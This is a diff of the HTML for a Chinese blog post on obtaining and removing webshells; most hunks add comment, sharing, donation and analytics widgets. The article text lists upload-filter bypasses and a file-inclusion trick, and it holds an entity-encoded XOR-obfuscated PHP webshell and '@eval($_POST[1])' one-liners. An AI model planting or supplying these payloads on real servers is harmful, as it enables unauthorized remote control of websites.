@@ -101,7 +101,7 @@
 顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限，以asp、php、jsp或cgi等网页形式存在得到一种命令执行环境。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。
 那么我们为什么">
 <meta property="og:image" content="https://shawnleon.github.io/images/q11.jpg">
-<meta property="og:updated_time" content="2016-08-05T00:58:30.975Z">
+<meta property="og:updated_time" content="2016-08-05T07:57:38.189Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="webshell获取与查杀">
 <meta name="twitter:description" content="webshell获取与查杀
@@ -294,6 +294,13 @@
 
           
             
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/08/04/get-webshell-searchkilling/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/04/get-webshell-searchkilling/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -301,6 +308,11 @@
           
           
 
+          
+              &nbsp; | &nbsp;
+              <span class="page-pv"><i class="fa fa-file-o"></i>
+              <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+              </span>
           
         </div>
       </header>
@@ -356,8 +368,10 @@
 <li>如果是代码写的上传功能</li>
 <li>上传一个正常jpg图片，查看路径</li>
 <li>上传图片一句话的jpg文件，抓包改后缀为php（可检测前端，mime，文件内容等验证）</li>
-<li>后缀过滤，%00截断。<br><em>绕过办法。当上述的改包失败后，只能上传一句话的jpg的时候。
-</em>解析漏洞 （判断web服务器类型和版本，并查找相关漏洞）<br>*结合其他功能 ，可结合文件包含，因为有图片路径。</li>
+<li>后缀过滤，%00截断。</li>
+<li>绕过办法。当上述的改包失败后，只能上传一句话的jpg的时候。</li>
+<li>解析漏洞 （判断web服务器类型和版本，并查找相关漏洞）</li>
+<li>结合其他功能 ，可结合文件包含，因为有图片路径。</li>
 </ul>
 </blockquote>
 </li>
@@ -396,7 +410,7 @@
 <h3 id="利用文件包含"><a href="#利用文件包含" class="headerlink" title="利用文件包含"></a>利用文件包含</h3><blockquote>
 <p>在脚本文件里写入 include(‘/upload/x.jpg’)    ///图马一句话</p>
 </blockquote>
-<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>&lt; \<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#x3f;&#112;&#104;&#x70;&#10;&#x40;&#x5c;&#x24;&#x5f;&#43;&#43;&#x3b;&#10;&#x5c;&#x24;&#95;&#95;&#x3d;&#x28;&#8220;&#x23;&#x22;&#94;&#34;&#124;&#34;&#41;&#46;&#x28;&#x22;&#x2e;&#34;&#94;&#34;&#x7e;&#x22;&#41;&#x2e;&#40;&#34;&#47;&#34;&#x5e;&#34;&#96;&#x22;&#41;&#x2e;&#x28;&#34;&#x7c;&#x22;&#x5e;&#x22;&#x2f;&#34;&#x29;&#46;&#x28;&#34;&#x7b;&#34;&#94;&#x22;&#47;&#x22;&#41;&#59;&#10;&#64;&#36;&#123;&#92;&#36;&#95;&#95;&#125;&#x5b;&#33;&#x5c;&#x24;&#95;&#93;&#x28;&#92;&#x24;&#123;&#92;&#36;&#x5f;&#x5f;&#x7d;&#91;&#x5c;&#x24;&#x5f;&#x5d;&#41;&#x3b;&#x3f;">&#x3f;&#112;&#104;&#x70;&#10;&#x40;&#x5c;&#x24;&#x5f;&#43;&#43;&#x3b;&#10;&#x5c;&#x24;&#95;&#95;&#x3d;&#x28;&#8220;&#x23;&#x22;&#94;&#34;&#124;&#34;&#41;&#46;&#x28;&#x22;&#x2e;&#34;&#94;&#34;&#x7e;&#x22;&#41;&#x2e;&#40;&#34;&#47;&#34;&#x5e;&#34;&#96;&#x22;&#41;&#x2e;&#x28;&#34;&#x7c;&#x22;&#x5e;&#x22;&#x2f;&#34;&#x29;&#46;&#x28;&#34;&#x7b;&#34;&#94;&#x22;&#47;&#x22;&#41;&#59;&#10;&#64;&#36;&#123;&#92;&#36;&#95;&#95;&#125;&#x5b;&#33;&#x5c;&#x24;&#95;&#93;&#x28;&#92;&#x24;&#123;&#92;&#36;&#x5f;&#x5f;&#x7d;&#91;&#x5c;&#x24;&#x5f;&#x5d;&#41;&#x3b;&#x3f;</a><br>\&lt;?<br>@$_POST<a href="\$_POST[1]">0</a><br>\&lt;?<br>@eval(\$_POST[1])</p>
+<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>&lt; \<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#111;&#58;&#63;&#112;&#104;&#112;&#10;&#64;&#x5c;&#36;&#95;&#43;&#x2b;&#59;&#10;&#x5c;&#x24;&#x5f;&#95;&#61;&#40;&#8220;&#x23;&#34;&#94;&#x22;&#124;&#x22;&#41;&#46;&#x28;&#34;&#x2e;&#x22;&#94;&#x22;&#126;&#x22;&#41;&#46;&#x28;&#x22;&#47;&#x22;&#x5e;&#34;&#x60;&#34;&#x29;&#x2e;&#40;&#34;&#124;&#34;&#x5e;&#34;&#x2f;&#x22;&#x29;&#x2e;&#40;&#34;&#123;&#x22;&#x5e;&#x22;&#x2f;&#34;&#41;&#x3b;&#xa;&#x40;&#x24;&#123;&#x5c;&#x24;&#x5f;&#95;&#125;&#x5b;&#x21;&#x5c;&#x24;&#95;&#93;&#40;&#x5c;&#x24;&#123;&#92;&#x24;&#95;&#x5f;&#x7d;&#x5b;&#92;&#36;&#95;&#x5d;&#x29;&#59;&#63;">&#63;&#112;&#104;&#112;&#10;&#64;&#x5c;&#36;&#95;&#43;&#x2b;&#59;&#10;&#x5c;&#x24;&#x5f;&#95;&#61;&#40;&#8220;&#x23;&#34;&#94;&#x22;&#124;&#x22;&#41;&#46;&#x28;&#34;&#x2e;&#x22;&#94;&#x22;&#126;&#x22;&#41;&#46;&#x28;&#x22;&#47;&#x22;&#x5e;&#34;&#x60;&#34;&#x29;&#x2e;&#40;&#34;&#124;&#34;&#x5e;&#34;&#x2f;&#x22;&#x29;&#x2e;&#40;&#34;&#123;&#x22;&#x5e;&#x22;&#x2f;&#34;&#41;&#x3b;&#xa;&#x40;&#x24;&#123;&#x5c;&#x24;&#x5f;&#95;&#125;&#x5b;&#x21;&#x5c;&#x24;&#95;&#93;&#40;&#x5c;&#x24;&#123;&#92;&#x24;&#95;&#x5f;&#x7d;&#x5b;&#92;&#36;&#95;&#x5d;&#x29;&#59;&#63;</a><br>\&lt;?<br>@$_POST<a href="\$_POST[1]">0</a><br>\&lt;?<br>@eval(\$_POST[1])</p>
 <h3 id="callback-函数"><a href="#callback-函数" class="headerlink" title="callback 函数"></a>callback 函数</h3><h3 id="修改php代码"><a href="#修改php代码" class="headerlink" title="修改php代码"></a>修改php代码</h3><blockquote>
 <p>修改主页的代码。加入一句话之类的。</p>
 </blockquote>
@@ -430,6 +444,27 @@
     <div>
       
         
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/donate.png" alt="shawnleon WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/alipay.jpg" alt="shawnleon Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
 
       
     </div>
@@ -468,6 +503,25 @@
 
     <div class="post-spread">
       
+        <div class="ds-share flat" data-thread-key="2016/08/04/get-webshell-searchkilling/"
+     data-title="webshell获取与查杀"
+     data-content=""
+     data-url="https://shawnleon.github.io/2016/08/04/get-webshell-searchkilling/">
+  <div class="ds-share-inline">
+    <ul  class="ds-share-icons-16">
+
+      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+
+    </ul>
+    <div class="ds-share-icons-more">
+    </div>
+  </div>
+</div>
+      
     </div>
   </div>
 
@@ -478,6 +532,10 @@
 
           
   <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2016/08/04/get-webshell-searchkilling/"
+           data-title="webshell获取与查杀" data-url="https://shawnleon.github.io/2016/08/04/get-webshell-searchkilling/">
+      </div>
     
   </div>
 
@@ -600,11 +658,11 @@
                 </li>
               
                 <li class="links-of-blogroll-item">
-                  <a href="http://leelie.github.io" title="伟伟's blog" target="_blank">伟伟's blog</a>
+                  <a href="http://leelie.github.io" title="伟伟leelie's blog" target="_blank">伟伟leelie's blog</a>
                 </li>
               
                 <li class="links-of-blogroll-item">
-                  <a href="http://lovexiaofeng.cn/" title="李小峰's blog" target="_blank">李小峰's blog</a>
+                  <a href="http://lovexiaofeng.cn/" title="call me小峰's blog" target="_blank">call me小峰's blog</a>
                 </li>
               
                 <li class="links-of-blogroll-item">
@@ -616,11 +674,11 @@
                 </li>
               
                 <li class="links-of-blogroll-item">
-                  <a href="https://nouername.github.io" title="qsf's blog" target="_blank">qsf's blog</a>
+                  <a href="https://nouername.github.io" title="帅乔飞's blog" target="_blank">帅乔飞's blog</a>
                 </li>
               
                 <li class="links-of-blogroll-item">
-                  <a href="https://passwd.tk" title="moon's blog" target="_blank">moon's blog</a>
+                  <a href="https://passwd.tk" title="moon明明如月's blog" target="_blank">moon明明如月's blog</a>
                 </li>
               
             </ul>
@@ -674,6 +732,22 @@
 </div>
 
         
+
+<div class="busuanzi-count">
+
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv"><i class="fa fa-user"></i><span class="busuanzi-value" id="busuanzi_value_site_uv"></span></span>
+  
+
+  
+    <span class="site-pv"><i class="fa fa-eye"></i><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span>
+  
+  
+</div>
+
+
 
         
       </div>
@@ -757,9 +831,30 @@
 
   
 
+  
+    
+  
 
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"shawnleon"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
 
   
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
 
 
 
